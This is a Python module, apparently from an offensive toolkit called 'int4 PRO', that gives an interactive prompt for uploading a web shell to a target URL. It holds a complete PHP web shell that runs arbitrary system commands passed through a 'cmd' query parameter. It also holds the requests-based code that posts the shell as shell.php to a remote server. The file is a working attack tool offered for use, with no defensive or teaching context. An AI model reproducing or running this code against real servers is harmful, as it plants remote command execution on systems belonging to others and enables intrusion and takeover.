from colorama import Fore, Style
import requests
import sys

def web_shell_uploader():
    print(f"{Fore.GREEN}Web Shell Uploader Module Started!{Style.RESET_ALL}")
    print("start with : upload (web)")
    while True:
        module = input(f"{Fore.RED + Style.BRIGHT}int4{Style.RESET_ALL} PRO({Fore.RED}WebShellUploader{Style.RESET_ALL}) > ")

        if module.lower() == "exit":
            print(f"{Fore.YELLOW}Exiting the module...{Style.RESET_ALL}")
            break
        
        elif module.startswith("upload "):
            try:
                _, url = module.split(" ")
                print(f"{Fore.YELLOW}Uploading web shell to {url}{Style.RESET_ALL}")
                web_shell_code = get_web_shell_code()
                upload_web_shell(url, web_shell_code)
                print(f"{Fore.GREEN}Web shell uploaded successfully!{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}Invalid input! Correct usage: upload <URL>{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Invalid command: {module}{Style.RESET_ALL}")


def get_web_shell_code():
    """
    Returns a simple PHP web shell code.
    """
    return """<?php
    if(isset($_GET['cmd'])){
        echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
    }
    ?>"""


def upload_web_shell(url, web_shell_code):
    """
    Uploads the web shell to the target server.
    """
    try:
        files = {'file': ('shell.php', web_shell_code, 'application/x-php')}
        response = requests.post(url, files=files)
        if response.status_code == 200:
            print(f"{Fore.GREEN}Web shell uploaded at: {url}/shell.php{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Failed to upload web shell. Status code: {response.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Error during upload: {e}{Style.RESET_ALL}")
if __name__ == "__main__" or "main":
	web_shell_uploader()